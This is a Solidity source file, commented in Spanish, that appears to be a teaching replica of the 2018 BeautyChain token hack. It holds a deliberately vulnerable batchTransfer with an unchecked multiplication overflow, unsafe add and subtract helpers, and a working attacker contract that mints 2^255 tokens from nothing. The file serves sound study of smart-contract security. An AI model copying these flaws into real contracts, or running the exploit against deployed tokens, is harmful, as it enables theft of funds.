// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;  // ⚠️ Pre-0.8 = Vulnerable a overflow

/**
 * BeautyChain (BEC) Vulnerable Token
 * 
 * Este contrato replica el bug del famoso hack de BeautyChain (Abril 2018)
 * donde se crearon 10^58 tokens mediante integer overflow
 */
contract VulnerableToken {
    
    mapping(address => uint256) public balances;
    uint256 public totalSupply;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event BatchTransfer(address indexed from, uint256 totalAmount);
    
    constructor() {
        totalSupply = 1000000 * 10**18;
        balances[msg.sender] = totalSupply;
    }
    
    /**
     * ❌ VULNERABLE: batchTransfer con overflow bug
     * 
     * Este es el código exacto que causó el hack de BeautyChain
     */
    function batchTransfer(address[] memory _receivers, uint256 _value) public returns (bool) {
        uint cnt = _receivers.length;
        uint256 amount = uint256(cnt) * _value;  // ⚠️ OVERFLOW AQUÍ
        
        require(cnt > 0 && cnt <= 20);
        require(_value > 0 && balances[msg.sender] >= amount);
        
        balances[msg.sender] = balances[msg.sender] - amount;
        
        for (uint i = 0; i < cnt; i++) {
            balances[_receivers[i]] = balances[_receivers[i]] + _value;
            emit Transfer(msg.sender, _receivers[i], _value);
        }
        
        emit BatchTransfer(msg.sender, amount);
        return true;
    }
    
    /**
     * ❌ VULNERABLE: Simple overflow
     */
    function unsafeAdd(uint256 a, uint256 b) public pure returns (uint256) {
        return a + b;  // Wraps on overflow
    }
    
    /**
     * ❌ VULNERABLE: Simple underflow
     */
    function unsafeSub(uint256 a, uint256 b) public pure returns (uint256) {
        return a - b;  // Wraps on underflow
    }
}

/**
 * Contrato atacante que explota el overflow
 */
contract OverflowAttacker {
    VulnerableToken public token;
    
    constructor(address _token) {
        token = VulnerableToken(_token);
    }
    
    /**
     * Replica el ataque real de BeautyChain
     */
    function attack() public {
        address[] memory receivers = new address[](2);
        receivers[0] = address(this);
        receivers[1] = msg.sender;
        
        // _value = 2^255
        // amount = 2 * 2^255 = 2^256 = 0 (overflow!)
        uint256 value = 2**255;
        
        token.batchTransfer(receivers, value);
        
        // Ahora tenemos 2^255 tokens creados de la nada
    }
}
